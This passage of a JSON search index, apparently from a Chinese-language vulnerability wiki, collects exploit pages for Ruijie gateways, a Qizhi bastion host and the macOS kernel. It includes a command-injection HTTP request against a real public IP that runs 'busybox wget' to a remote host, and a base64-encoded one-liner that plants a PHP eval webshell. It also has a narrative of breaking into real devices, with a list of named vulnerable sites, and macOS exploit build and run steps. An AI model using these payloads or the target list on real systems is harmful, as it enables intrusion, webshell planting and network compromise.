2020-08-26-WPS\u66f4\u65b0\u8bf4\u6b64\u95ee\u9898\u5df2\u8f6c\u53d1\u7ed9\u5f00\u53d1\u56e2\u961f\u3002 2020-08-28-WPS\u53d1\u9001\u4e86\u4e00\u5c01\u7535\u5b50\u90ae\u4ef6\uff0c\u6307\u51fa\u8be5\u95ee\u9898\u5df2\u5728\u6700\u65b0\u7684\u4e0b\u8f7d\u7248\u672c11.2.0.9403\u4e2d\u5f97\u5230\u89e3\u51b3\u3002 2020-08-28-\u9488\u5bf9\u63d0\u4f9b\u7684PoC\u6d4b\u8bd5\u4e86\u65b0\u7248\u672c\uff0c\u5e76\u786e\u8ba4\u95ee\u9898\u5df2\u89e3\u51b3\u3002 2020-08-28-\u5411WPS\u56e2\u961f\u5bfb\u6c42\u54a8\u8be2\u6216\u66f4\u6539\u65e5\u5fd7\u66f4\u65b0\u3002 2020-08-31-WPS\u56e2\u961f\u901a\u77e5\u4ed6\u4eec\u4e0d\u518d\u66f4\u65b0\u6216\u7ef4\u62a4\u4efb\u4f55\u5b89\u5168\u516c\u544a\u3002 2020-09-03-\u6f0f\u6d1e\u5199\u4fe1 \u8981\u6c42CVE\u3002","title":"\u62ab\u9732\u65f6\u95f4\u8868"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7%E6%98%93/%E9%94%90%E6%8D%B7%E6%98%93%E7%BD%91%E5%85%B3%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","text":"\u6d4b\u8bd5\u56fa\u4ef6\u7248\u672c\u4e3a EG_RGOS11.9(4)B11P1_EG3200_install guest_auth \u4e2d\u7684 guestIsUp.php \u6587\u4ef6\u5b58\u5728\u95ee\u9898 \u53ef\u4ee5\u660e\u663e\u770b\u51fa\u8fd9\u91cc\u53ef\u4ee5\u5b58\u5728\u62fc\u63a5\u8fbe\u5230\u547d\u4ee4\u6267\u884c\u7684\u6548\u679c\u3002 \u6784\u9020\u76f8\u5e94\u7684 poc \u53ef\u8fbe\u5230\u547d\u4ee4\u6267\u884c POC \u00b6 POST /guest_auth/guestIsUp.php HTTP/1.1 Host: 120.35.11.141:9999 Connection: keep-alive Content-Length: 45 Pragma: no-cache Cache-Control: no-cache Accept: application/json, text/javascript, */*; q=0.01 Origin: http://120.35.11.141:9999 X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36 Content-Type: application/x-www-form-urlencoded Referer: http://120.35.11.141:9999/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 mac=1&ip='busybox wget xxxxx:8888'","title":"\u9510\u6377\u6613\u7f51\u5173 \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7%E6%98%93/%E9%94%90%E6%8D%B7%E6%98%93%E7%BD%91%E5%85%B3%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#poc","text":"POST /guest_auth/guestIsUp.php HTTP/1.1 Host: 120.35.11.141:9999 Connection: keep-alive Content-Length: 45 Pragma: no-cache Cache-Control: no-cache Accept: application/json, text/javascript, */*; q=0.01 Origin: http://120.35.11.141:9999 X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36 Content-Type: application/x-www-form-urlencoded Referer: http://120.35.11.141:9999/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 mac=1&ip='busybox wget xxxxx:8888'","title":"POC"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7%E6%98%93/%E9%94%90%E6%8D%B7%E6%98%93%E7%BD%91%E5%85%B3guest%E8%B6%8A%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","text":"\u6f0f\u6d1e\u8be6\u60c5 \u00b6 \u8be6\u7ec6\u8bf4\u660e\uff1a \u00b6 \u6f0f\u6d1e\u8bc1\u660e\uff1a \u00b6 1.\u767e\u5ea6\u641c\u7d22\uff1a\u201c\u8bf7\u8f93\u5165\u60a8\u7684RG-EG\u6613\u7f51\u5173\u7684\u7528\u6237\u540d\u548c\u5bc6\u7801\u201d 2\uff0c\u627e\u4e86\u4e00\u4e2a\u767b\u5f55\u6293\u5305 \u53d1\u73b0\u53c2\u6570\u5f88\u6709\u610f\u601dcommand=\u6267\u884c\u7684\u547d\u4ee4strurl=\u5e94\u8be5\u662f\u5f53\u524d\u7684\u8fd0\u884c\u6a21\u5f0f\u6316\u6398\u540e\u53d1\u73b0\u6709exec config\u7b49mode=priv_exec\u76f4\u63a5\u7279\u6743\u6a21\u5f0f3.\u4e8e\u662fshow run\u4e00\u4e0b \u6ce8\u610f\u5230\u8fd9\u91cc\u6709\u4e00\u4e2awebmaster level 0 1 2\u901a\u8fc7\u4e86\u89e30\u7684\u7ea7\u522b\u662f\u6700\u9ad8\u7684\uff0c\u4e5f\u5c31\u662f\u6743\u9650\u662f\u6700\u597d\u7684\uff0c1\u548c2 \u4f9d\u6b21\u51cf\u4f4e\u90a3\u6211\u662f\u5426\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7\u6267\u884cwebmaster level 0 username guest password guest\u6765\u63d0\u5347\u6743\u9650\u5462\uff1f\u8bd5\u4e00\u4e0b \u628astrurl\u6539\u6210config\u5373\u53ef\u6267\u884c\u6210\u529f\u5982\u6b64\u8bf4\u6765\u6211\u5c31\u53ef\u4ee5\u76f4\u63a5\u6267\u884c\u6240\u6709\u7684\u547d\u4ee4\u5566\uff0c\u4f46\u6ca1\u5fc5\u8981\u8fd9\u4e48\u9ebb\u70e6\u4e86\u3002\u518d\u67e5\u770bshow run\u6700\u4e0b\u9762\u53d1\u4e0b\u6709telnet\u7684\u5bc6\u7801\u4fe1\u606f \u4e8e\u662f\u76f4\u63a5telnet\u8fdb\u6765\u4e86 \u7136\u540e\u561b\uff0c\u5c31\u662f\u914d\u7f6e\u4e00\u4e2avpn\uff0c\u76f4\u63a5\u5185\u7f51\u6f2b\u6e38\u4e86 \u597d\u5427\uff0c\u6211\u662f\u597d\u5b69\u5b50\uff0c\u914d\u7f6e\u5df2\u7ecf\u8fd8\u539f\u4e86\u8bd5\u4e86\u767e\u5ea6\u641c\u7d22\u51fa\u6765\u7684\u5341\u6765\u4e2a\u94fe\u63a5\uff0c\u53d1\u73b0\u5f31\u53e3\u4ee4\u90fd\u6709http:// www.jincai.sh.cn:12315/index.htmhttp://jsgz.cn/http://xczp.qhrcsc.comhttp://lbszx.comhttp://www.zmjsjt.cnhttp://wcjy.zhjedu.cn/index.htmhttp://www.lflszx.comhttp://www.jyxqxx.com:88/index.htmhttp://www.lvtaotao.comhttp://oa.haotel.comhttp://www.tzcgps.cn/index.htm\u767e\u5ea6\u90a3\u4e48\u591a\u6ca1\u6562\u4e00\u4e2a\u4e00\u4e2a\u8bd5\u8bdd\u8bf4\u6211\u770b\u5230\u5176\u5b83\u6f0f\u6d1e \uff0c\u5382\u5546\u56de\u590d\u5df2\u7ecf\u505a\u4e86\u8865\u4e01\uff0c\u4f46\u8fd9\u4e9b\u8fd8\u5728\u53d7\u5bb3\u7684\u7528\u6237\uff0c\u660e\u663e\u4ed6\u4eec\u8fd8\u4e0d\u77e5\u9053\u8be5\u95ee\u9898\uff0c\u90a3\u8be5\u600e\u4e48\u529e\uff1f\u5bf9\u4e86\uff0c\u8bdd\u8bf4\u6700\u8fd1\u770b\u5230\u9510\u6377\u53d1\u4e86\u4e00\u4e2a\u65b0\u7f51\u5173\u4ea7\u54c1 eg350\uff0c\u770b\u94fe\u63a5\u597d\u50cfweb\u662f\u7528\u7684php\u7684\uff0c\u901a\u8fc7\u6316\u6398\u5df2\u7ecf\u53d1\u73b0\u90e8\u5206\u6f0f\u6d1e\uff0c\u7248\u672c\u53f7\uff08EG_RGOS 11.1(3)B1T3, Release(02162111)\uff09\uff0c\u4f46\u4e0d\u77e5\u9053\u662f\u4e0d\u662f\u5382\u5546\u7684\u9057\u7559\u7248\u672c\uff0c\u5982\u679c\u4e0d\u662f\u8bf7\u544a\u77e5\uff0c\u6211\u4f1a\u8865\u51fa\u6765\uff0c\u5982\u679c\u662f\u90a3\u5c31\u5ffd\u7565\u5427\u3002 \u4fee\u590d\u65b9\u6848\uff1a \u00b6 \u5347\u7ea7\u5230\u6700\u65b0\u7248\u672c","title":"\u9510\u6377\u6613\u7f51\u5173guest\u8d8a\u6743\u547d\u4ee4\u6267\u884c"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7%E6%98%93/%E9%94%90%E6%8D%B7%E6%98%93%E7%BD%91%E5%85%B3guest%E8%B6%8A%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#_1","text":"","title":"\u6f0f\u6d1e\u8be6\u60c5"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7%E6%98%93/%E9%94%90%E6%8D%B7%E6%98%93%E7%BD%91%E5%85%B3guest%E8%B6%8A%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#_2","text":"","title":"\u8be6\u7ec6\u8bf4\u660e\uff1a"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7%E6%98%93/%E9%94%90%E6%8D%B7%E6%98%93%E7%BD%91%E5%85%B3guest%E8%B6%8A%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#_3","text":"1.\u767e\u5ea6\u641c\u7d22\uff1a\u201c\u8bf7\u8f93\u5165\u60a8\u7684RG-EG\u6613\u7f51\u5173\u7684\u7528\u6237\u540d\u548c\u5bc6\u7801\u201d 2\uff0c\u627e\u4e86\u4e00\u4e2a\u767b\u5f55\u6293\u5305 \u53d1\u73b0\u53c2\u6570\u5f88\u6709\u610f\u601dcommand=\u6267\u884c\u7684\u547d\u4ee4strurl=\u5e94\u8be5\u662f\u5f53\u524d\u7684\u8fd0\u884c\u6a21\u5f0f\u6316\u6398\u540e\u53d1\u73b0\u6709exec config\u7b49mode=priv_exec\u76f4\u63a5\u7279\u6743\u6a21\u5f0f3.\u4e8e\u662fshow run\u4e00\u4e0b \u6ce8\u610f\u5230\u8fd9\u91cc\u6709\u4e00\u4e2awebmaster level 0 1 2\u901a\u8fc7\u4e86\u89e30\u7684\u7ea7\u522b\u662f\u6700\u9ad8\u7684\uff0c\u4e5f\u5c31\u662f\u6743\u9650\u662f\u6700\u597d\u7684\uff0c1\u548c2 \u4f9d\u6b21\u51cf\u4f4e\u90a3\u6211\u662f\u5426\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7\u6267\u884cwebmaster level 0 username guest password guest\u6765\u63d0\u5347\u6743\u9650\u5462\uff1f\u8bd5\u4e00\u4e0b \u628astrurl\u6539\u6210config\u5373\u53ef\u6267\u884c\u6210\u529f\u5982\u6b64\u8bf4\u6765\u6211\u5c31\u53ef\u4ee5\u76f4\u63a5\u6267\u884c\u6240\u6709\u7684\u547d\u4ee4\u5566\uff0c\u4f46\u6ca1\u5fc5\u8981\u8fd9\u4e48\u9ebb\u70e6\u4e86\u3002\u518d\u67e5\u770bshow run\u6700\u4e0b\u9762\u53d1\u4e0b\u6709telnet\u7684\u5bc6\u7801\u4fe1\u606f \u4e8e\u662f\u76f4\u63a5telnet\u8fdb\u6765\u4e86 \u7136\u540e\u561b\uff0c\u5c31\u662f\u914d\u7f6e\u4e00\u4e2avpn\uff0c\u76f4\u63a5\u5185\u7f51\u6f2b\u6e38\u4e86 \u597d\u5427\uff0c\u6211\u662f\u597d\u5b69\u5b50\uff0c\u914d\u7f6e\u5df2\u7ecf\u8fd8\u539f\u4e86\u8bd5\u4e86\u767e\u5ea6\u641c\u7d22\u51fa\u6765\u7684\u5341\u6765\u4e2a\u94fe\u63a5\uff0c\u53d1\u73b0\u5f31\u53e3\u4ee4\u90fd\u6709http:// www.jincai.sh.cn:12315/index.htmhttp://jsgz.cn/http://xczp.qhrcsc.comhttp://lbszx.comhttp://www.zmjsjt.cnhttp://wcjy.zhjedu.cn/index.htmhttp://www.lflszx.comhttp://www.jyxqxx.com:88/index.htmhttp://www.lvtaotao.comhttp://oa.haotel.comhttp://www.tzcgps.cn/index.htm\u767e\u5ea6\u90a3\u4e48\u591a\u6ca1\u6562\u4e00\u4e2a\u4e00\u4e2a\u8bd5\u8bdd\u8bf4\u6211\u770b\u5230\u5176\u5b83\u6f0f\u6d1e \uff0c\u5382\u5546\u56de\u590d\u5df2\u7ecf\u505a\u4e86\u8865\u4e01\uff0c\u4f46\u8fd9\u4e9b\u8fd8\u5728\u53d7\u5bb3\u7684\u7528\u6237\uff0c\u660e\u663e\u4ed6\u4eec\u8fd8\u4e0d\u77e5\u9053\u8be5\u95ee\u9898\uff0c\u90a3\u8be5\u600e\u4e48\u529e\uff1f\u5bf9\u4e86\uff0c\u8bdd\u8bf4\u6700\u8fd1\u770b\u5230\u9510\u6377\u53d1\u4e86\u4e00\u4e2a\u65b0\u7f51\u5173\u4ea7\u54c1 eg350\uff0c\u770b\u94fe\u63a5\u597d\u50cfweb\u662f\u7528\u7684php\u7684\uff0c\u901a\u8fc7\u6316\u6398\u5df2\u7ecf\u53d1\u73b0\u90e8\u5206\u6f0f\u6d1e\uff0c\u7248\u672c\u53f7\uff08EG_RGOS 11.1(3)B1T3, Release(02162111)\uff09\uff0c\u4f46\u4e0d\u77e5\u9053\u662f\u4e0d\u662f\u5382\u5546\u7684\u9057\u7559\u7248\u672c\uff0c\u5982\u679c\u4e0d\u662f\u8bf7\u544a\u77e5\uff0c\u6211\u4f1a\u8865\u51fa\u6765\uff0c\u5982\u679c\u662f\u90a3\u5c31\u5ffd\u7565\u5427\u3002","title":"\u6f0f\u6d1e\u8bc1\u660e\uff1a"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7%E6%98%93/%E9%94%90%E6%8D%B7%E6%98%93%E7%BD%91%E5%85%B3guest%E8%B6%8A%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#_4","text":"\u5347\u7ea7\u5230\u6700\u65b0\u7248\u672c","title":"\u4fee\u590d\u65b9\u6848\uff1a"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7%E6%98%93/%E9%94%90%E6%8D%B7%E6%98%93%E7%BD%91%E5%85%B3%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","text":"\u6f0f\u6d1e\u8bf4\u660e \u00b6 \u5728web\u7ba1\u7406\u9875\u9762\u4e0a\uff0c\u4f7f\u7528\u7ba1\u7406\u5458\u7684\u7528\u6237\u540d\u5bc6\u7801\u767b\u5f55\u8bbe\u5907\u540e\uff0c\u53ef\u901a\u8fc7web\u9875\u9762\u6267\u884c\u90e8\u5206\u64cd\u4f5c\u547d\u4ee4\uff0c\u8bbe\u5907\u4e0a\u6709\u63a5\u53e3\u6765\u8bfb\u53d6\u8fd9\u4e9b\u64cd\u4f5c\u547d\u4ee4\u7684\u8fd4\u56de\u503c\u3002\u63a5\u53e3\u5bf9\u8fd4\u56de\u503c\u4e2d\u5b58\u5728\u7684\u6076\u610f\u6307\u4ee4\u8fc7\u6ee4\u4e0d\u5145\u5206\uff0c\u5bfc\u81f4\u8bbe\u5907\u53ef\u4ee5\u901a\u8fc7CLI\u88ab\u8fdc\u7a0b\u6267\u884c\u4e00\u4e9b\u6076\u610f\u6307\u4ee4\uff0c\u5bf9\u8bbe\u5907\u6b63\u5e38\u8fd0\u884c\u9020\u6210\u5f71\u54cd\u3002 \u5f71\u54cd\u8303\u56f4 \u00b6 \u76ee\u524d\u4ec5\u7f51\u5173\u4ea7\u54c1\u768411x\u7248\u672c\u5b58\u5728\u6b64\u95ee\u9898\uff0c10.x\u7248\u672c\u672a\u53d1\u73b0\u6b64\u95ee\u9898\u3002 \u6f0f\u6d1e\u8be6\u60c5 \u00b6 web\u9875\u9762\u7684\u7ba1\u7406\u5458\u7528\u6237\u540d\u3001\u5bc6\u7801\u6cc4\u6f0f\uff0c\u4e14http\u767b\u5f55\u8bbf\u95ee\u6210\u529f\u7684\u60c5\u51b5\u4e0b\u4f1a\u53d1\u751f\u3002 \u8fdb\u5165\u9510\u6377\u6613\u7f51\u5173\u767b\u5f55\u754c\u9762\uff0c\u6293\u53d6\u4e00\u4e2a\u767b\u5f55\u6570\u636e\u5305\uff1a \u53d1\u73b0\u53c2\u6570\u4e2d\u6709command=\u6267\u884c\u7684\u547d\uff0cstrurl=\u5e94\u8be5\u662f\u5f53\u524d\u7684\u8fd0\u884c\u6a21\u5f0f\u6316\u6398\u540e\u53d1\u73b0\u6709exec\u548cconfig\u7b49\uff0cmode=priv_exec\u76f4\u63a5\u7279\u6743\u6a21\u5f0f \u8f93\u5165 sh run\u547d\u4ee4\u8fdb\u884c\u5c1d\u8bd5\uff0c\u53ef\u67e5\u770b\u5230\u6709\u76f8\u5e94\u7684\u7528\u6237\u4fe1\u606f\uff1a \u6ce8\u610f\u5230\u8fd9\u91cc\u6709\u4e00\u4e2awebmaster level 0 1 2\uff0c\u901a\u8fc7\u4e86\u89e30\u7684\u7ea7\u522b\u662f\u6700\u9ad8\u7684\uff0c\u4e5f\u5c31\u662f\u6743\u9650\u662f\u6700\u597d\u7684\uff0c1\u548c2 \u4f9d\u6b21\u51cf\u4f4e\u3002 \u5c1d\u8bd5\u901a\u8fc7\u6267\u884cwebmaster level 0 username guest password guest\u6765\u63d0\u5347\u6743\u9650\uff0c\u9700\u8981\u628astrurl\u6539\u6210config\u5373\u53ef\u6267\u884c\u6210\u529f\u3002 \u518d\u67e5\u770bshow run\u6700\u4e0b\u9762\u53d1\u4e0b\u6709telnet\u7684\u5bc6\u7801\u4fe1\u606f\uff1a \u4e4b\u540e\u5c31\u53ef\u901a\u8fc7telnet\u8fdb\u5165\uff0c\u518d\u914d\u7f6e\u4e00\u4e2aVPN\u8d26\u53f7\u540e\u5c31\u53ef\u8fdb\u884c\u5185\u7f51\u6f2b\u6e38\uff1a \u7279\u5f81\uff1a \u00b6 \u7248\u672c\uff1a\u9510\u6377\u6613\u7f51\u5173\u4ea7\u54c111x\u7248\u672c \u534f\u8bae\uff1ahttp\u534f\u8bae\uff0c\u9ed8\u8ba4\u7aef\u53e380 \u6d41\u91cf\u63a2\u6d4b\u53c2\u6570\u4e2d\u5305\u542b\uff1acommand=\u3001strurl=\u3001 exec\u3001 config\u3001mode=priv_exec \u6d41\u91cf\u63d0\u6743\u53c2\u6570\uff1awebmaster level 0 username guest password guest \u76f8\u5173\u8bbe\u5907\u547d\u4ee4\uff1ashow run\u3001sh run \u65b0\u589e\u5f02\u5e38VPN\u8d26\u53f7","title":"\u9510\u6377\u6613\u7f51\u5173\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7%E6%98%93/%E9%94%90%E6%8D%B7%E6%98%93%E7%BD%91%E5%85%B3%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#_1","text":"\u5728web\u7ba1\u7406\u9875\u9762\u4e0a\uff0c\u4f7f\u7528\u7ba1\u7406\u5458\u7684\u7528\u6237\u540d\u5bc6\u7801\u767b\u5f55\u8bbe\u5907\u540e\uff0c\u53ef\u901a\u8fc7web\u9875\u9762\u6267\u884c\u90e8\u5206\u64cd\u4f5c\u547d\u4ee4\uff0c\u8bbe\u5907\u4e0a\u6709\u63a5\u53e3\u6765\u8bfb\u53d6\u8fd9\u4e9b\u64cd\u4f5c\u547d\u4ee4\u7684\u8fd4\u56de\u503c\u3002\u63a5\u53e3\u5bf9\u8fd4\u56de\u503c\u4e2d\u5b58\u5728\u7684\u6076\u610f\u6307\u4ee4\u8fc7\u6ee4\u4e0d\u5145\u5206\uff0c\u5bfc\u81f4\u8bbe\u5907\u53ef\u4ee5\u901a\u8fc7CLI\u88ab\u8fdc\u7a0b\u6267\u884c\u4e00\u4e9b\u6076\u610f\u6307\u4ee4\uff0c\u5bf9\u8bbe\u5907\u6b63\u5e38\u8fd0\u884c\u9020\u6210\u5f71\u54cd\u3002","title":"\u6f0f\u6d1e\u8bf4\u660e"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7%E6%98%93/%E9%94%90%E6%8D%B7%E6%98%93%E7%BD%91%E5%85%B3%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#_2","text":"\u76ee\u524d\u4ec5\u7f51\u5173\u4ea7\u54c1\u768411x\u7248\u672c\u5b58\u5728\u6b64\u95ee\u9898\uff0c10.x\u7248\u672c\u672a\u53d1\u73b0\u6b64\u95ee\u9898\u3002","title":"\u5f71\u54cd\u8303\u56f4"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7%E6%98%93/%E9%94%90%E6%8D%B7%E6%98%93%E7%BD%91%E5%85%B3%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#_3","text":"web\u9875\u9762\u7684\u7ba1\u7406\u5458\u7528\u6237\u540d\u3001\u5bc6\u7801\u6cc4\u6f0f\uff0c\u4e14http\u767b\u5f55\u8bbf\u95ee\u6210\u529f\u7684\u60c5\u51b5\u4e0b\u4f1a\u53d1\u751f\u3002 \u8fdb\u5165\u9510\u6377\u6613\u7f51\u5173\u767b\u5f55\u754c\u9762\uff0c\u6293\u53d6\u4e00\u4e2a\u767b\u5f55\u6570\u636e\u5305\uff1a \u53d1\u73b0\u53c2\u6570\u4e2d\u6709command=\u6267\u884c\u7684\u547d\uff0cstrurl=\u5e94\u8be5\u662f\u5f53\u524d\u7684\u8fd0\u884c\u6a21\u5f0f\u6316\u6398\u540e\u53d1\u73b0\u6709exec\u548cconfig\u7b49\uff0cmode=priv_exec\u76f4\u63a5\u7279\u6743\u6a21\u5f0f \u8f93\u5165 sh run\u547d\u4ee4\u8fdb\u884c\u5c1d\u8bd5\uff0c\u53ef\u67e5\u770b\u5230\u6709\u76f8\u5e94\u7684\u7528\u6237\u4fe1\u606f\uff1a \u6ce8\u610f\u5230\u8fd9\u91cc\u6709\u4e00\u4e2awebmaster level 0 1 2\uff0c\u901a\u8fc7\u4e86\u89e30\u7684\u7ea7\u522b\u662f\u6700\u9ad8\u7684\uff0c\u4e5f\u5c31\u662f\u6743\u9650\u662f\u6700\u597d\u7684\uff0c1\u548c2 \u4f9d\u6b21\u51cf\u4f4e\u3002 \u5c1d\u8bd5\u901a\u8fc7\u6267\u884cwebmaster level 0 username guest password guest\u6765\u63d0\u5347\u6743\u9650\uff0c\u9700\u8981\u628astrurl\u6539\u6210config\u5373\u53ef\u6267\u884c\u6210\u529f\u3002 \u518d\u67e5\u770bshow run\u6700\u4e0b\u9762\u53d1\u4e0b\u6709telnet\u7684\u5bc6\u7801\u4fe1\u606f\uff1a \u4e4b\u540e\u5c31\u53ef\u901a\u8fc7telnet\u8fdb\u5165\uff0c\u518d\u914d\u7f6e\u4e00\u4e2aVPN\u8d26\u53f7\u540e\u5c31\u53ef\u8fdb\u884c\u5185\u7f51\u6f2b\u6e38\uff1a","title":"\u6f0f\u6d1e\u8be6\u60c5"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7%E6%98%93/%E9%94%90%E6%8D%B7%E6%98%93%E7%BD%91%E5%85%B3%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#_4","text":"\u7248\u672c\uff1a\u9510\u6377\u6613\u7f51\u5173\u4ea7\u54c111x\u7248\u672c \u534f\u8bae\uff1ahttp\u534f\u8bae\uff0c\u9ed8\u8ba4\u7aef\u53e380 \u6d41\u91cf\u63a2\u6d4b\u53c2\u6570\u4e2d\u5305\u542b\uff1acommand=\u3001strurl=\u3001 exec\u3001 config\u3001mode=priv_exec \u6d41\u91cf\u63d0\u6743\u53c2\u6570\uff1awebmaster level 0 username guest password guest \u76f8\u5173\u8bbe\u5907\u547d\u4ee4\uff1ashow run\u3001sh run \u65b0\u589e\u5f02\u5e38VPN\u8d26\u53f7","title":"\u7279\u5f81\uff1a"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E9%BD%90%E6%B2%BB/%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA%E5%89%8D%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","text":"\u6f0f\u6d1e\u8303\u56f4 \u00b6 ShtermClient-2.1.1 \u6f0f\u6d1e\u5229\u7528 \u00b6 1.\u8bbf\u95ee http://10.20.10.11/listener/cluster _manage.php \u8fd4\u56deOK 2.\u8bbf\u95ee\u5982\u4e0b\u94fe\u63a5\u751f\u6210\u4e00\u53e5\u8bdd\u6728\u9a6c https://10.20.10.10/ha_request.php?action=install&ipaddr=10.20.10.11&node_id=1${IFS}|`echo${IFS}\"ZWNobyAnPD9waHAgQGV2YWwoJF9SRVFVRVNUW3NoZWxsXSk7Pz4nPj4vdmFyL3d3dy9zaHRlcm0vcmVzb3VyY2VzL3FyY29kZS9zaGVsbC5waHA=\"|base64${IFS}-d|bash`|${IFS}|echo${IFS}","title":"\u9f50\u6cbb\u5821\u5792\u673a\u524d\u53f0\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e-0day"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E9%BD%90%E6%B2%BB/%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA%E5%89%8D%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_1","text":"ShtermClient-2.1.1","title":"\u6f0f\u6d1e\u8303\u56f4"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E9%BD%90%E6%B2%BB/%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA%E5%89%8D%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_2","text":"1.\u8bbf\u95ee http://10.20.10.11/listener/cluster _manage.php \u8fd4\u56deOK 2.\u8bbf\u95ee\u5982\u4e0b\u94fe\u63a5\u751f\u6210\u4e00\u53e5\u8bdd\u6728\u9a6c https://10.20.10.10/ha_request.php?action=install&ipaddr=10.20.10.11&node_id=1${IFS}|`echo${IFS}\"ZWNobyAnPD9waHAgQGV2YWwoJF9SRVFVRVNUW3NoZWxsXSk7Pz4nPj4vdmFyL3d3dy9zaHRlcm0vcmVzb3VyY2VzL3FyY29kZS9zaGVsbC5waHA=\"|base64${IFS}-d|bash`|${IFS}|echo${IFS}","title":"\u6f0f\u6d1e\u5229\u7528"},{"location":"05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/MacOS/macOS-Kernel-Exploit/","text":"macOS-Kernel-Exploit \u00b6 DISCLAIMER \u00b6 You need to know the KASLR slide to use the exploit. Also SMAP needs to be disabled which means that it's not exploitable on Macs after 2015. These limitations make the exploit pretty much unusable for in-the-wild exploitation but still helpful for security researchers in a controlled lab environment. This exploit is intended for security research purposes only. General \u00b6 macOS Kernel Exploit for CVE-????-???? (currently a 0day. I'll add the CVE# once it is published ;) ). Thanks to @LinusHenze for this cool bug and his support ;P. Writeup \u00b6 Probably coming soon. If you want to try and exploit it yourself, here are a few things to get you started: VM: Download the macOS installer from the appstore and drag the .app file into VMWare's NEW VM window Kernel Debugging setup: http://ddeville.me/2015/08/using-the-vmware-fusion-gdb-stub-for-kernel-debugging-with-lldb Have a look at the _kernel_trap function Build \u00b6 I recommend setting the bootargs to: debug=0x44 kcsuffix=development -v Note : SMAP needs to be disabled on macs after 2015 ( -pmap_smap_disable ) You will need XCODE <= 9.4.1 to build the exploit. (It needs to be 32bit) Downloading Xcode 9.4.1 Commandline Tools should be enough ;) Download: https://developer.apple.com/download/more/ make Execution \u00b6 ./exploit <KASLR slide> Tested on macOS Mojave: Darwin Kernel-Mac.local 18.7.0 Darwin Kernel Version 18.7.0: Thu Jun 20 18:42:21 PDT 2019; root:xnu-4903.270.47~4/DEVELOPMENT_X86_64 x86_64 Demo :","title":"macOS-Kernel-Exploit"},{"location":"05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/MacOS/macOS-Kernel-Exploit/#macos-kernel-exploit","text":"","title":"macOS-Kernel-Exploit"},{"location":"05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/MacOS/macOS-Kernel-Exploit/#disclaimer","text":"You need to know the KASLR slide to use the exploit. Also SMAP needs to be disabled which means that it's not exploitable on Macs after 2015. These limitations make the exploit 